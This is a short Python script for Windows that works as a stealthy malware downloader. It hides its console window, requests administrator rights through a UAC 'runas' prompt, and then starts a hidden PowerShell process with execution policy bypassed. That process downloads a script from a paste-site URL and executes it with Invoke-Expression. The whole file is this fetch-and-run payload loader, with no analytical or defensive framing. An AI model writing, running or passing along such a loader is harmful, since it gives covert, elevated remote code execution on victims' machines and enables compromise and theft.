import subprocess
import ctypes
import sys
import os 
import win32process

hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
if hwnd != 0:      
    ctypes.windll.user32.ShowWindow(hwnd, 0)      
    ctypes.windll.kernel32.CloseHandle(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)

def run_as_admin():
    if not os.path.isfile(sys.executable):
        raise ValueError("Script not running in an executable.")
    
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def execute_script_from_url(url):
    powershell_cmd = f'cmd /c start /min "" powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri \'{url}\').Content"'
    try:
        os.system(powershell_cmd)
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute script: {e.stderr.decode()}")

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        run_as_admin()

    script_url = "https://cdn.sourceb.in/bins/ZXY5NMimKs/0"
    execute_script_from_url(script_url)
